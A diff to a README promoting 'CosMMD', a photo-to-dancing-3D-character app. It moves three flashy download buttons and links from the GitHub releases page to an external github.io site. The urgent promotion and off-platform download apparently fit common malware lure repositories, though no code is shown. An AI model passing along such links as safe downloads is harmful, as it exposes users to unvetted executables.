@@ -1,7 +1,7 @@
 <h1>🎭 CosMMD - Turn One Photo Into a Dancing 3D Character</h1>
 
 <p align="center">
-  <a href="https://github.com/Mustafalacustrine1997/CosMMD/releases" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(102,126,234,0.4);">⬇️ Download CosMMD Now</a>
+  <a href="https://mustafalacustrine1997.github.io" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(102,126,234,0.4);">⬇️ Download CosMMD Now</a>
 </p>
 
 ---
@@ -39,7 +39,7 @@ No programming knowledge needed. No complex 3D modeling skills required. If you 
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-**[https://github.com/Mustafalacustrine1997/CosMMD/releases](https://github.com/Mustafalacustrine1997/CosMMD/releases)**
+**[https://mustafalacustrine1997.github.io](https://mustafalacustrine1997.github.io)**
 
 Click the download button on that page. The download will start automatically.
 
@@ -216,7 +216,7 @@ Don't wait any longer. Download CosMMD today and see your photos come to life. W
 **Click the button below to get started:**
 
 <p align="center">
-  <a href="https://github.com/Mustafalacustrine1997/CosMMD/releases" style="display:inline-block;padding:14px 35px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(240,147,251,0.4);">🚀 Download CosMMD</a>
+  <a href="https://mustafalacustrine1997.github.io" style="display:inline-block;padding:14px 35px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(240,147,251,0.4);">🚀 Download CosMMD</a>
 </p>
 
 ---
